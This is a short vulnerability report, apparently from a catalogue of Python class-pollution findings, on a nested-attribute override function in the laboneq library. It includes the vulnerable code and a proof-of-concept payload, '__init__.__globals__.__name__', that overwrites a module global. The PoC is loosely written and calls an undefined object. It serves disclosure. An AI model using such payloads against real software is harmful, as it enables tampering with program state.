## laboneq

### Meta

+ Library: laboneq
+ Stars: 39
+ Version: v2.44.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```_override_qubit_parameters(obj, {'__init__.__globals__.__name__':'polluted'})```
+ Foundby: redacted
+ Report: Pending
+ Type: Lib
+ Exploitability: Low
+ Input: Func

### Library

https://github.com/zhinst/laboneq

### Vulnerable Code Snippet

```
@classmethod
def _override_qubit_parameters(cls, qubit, overrides: dict) -> None:
    invalid_params = cls._get_invalid_param_paths(qubit, overrides)
    if invalid_params:
        raise ValueError(
            f"Update parameters do not match the qubit "
            f"parameters: {invalid_params}",
        )

    for param_path, value in overrides.items():
        keys = param_path.split(".")
        obj = qubit.parameters
        for key in keys[:-1]:
            obj = obj[key] if isinstance(obj, dict) else getattr(obj, key)
        if isinstance(obj, dict):
            if keys[-1] in obj:
                obj[keys[-1]] = value
        elif hasattr(obj, keys[-1]):
            setattr(obj, keys[-1], value)
```
### PoC

```
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

_override_qubit_parameters(obj, {'__init__.__globals__.__name__':'polluted'})
print(__name__)
```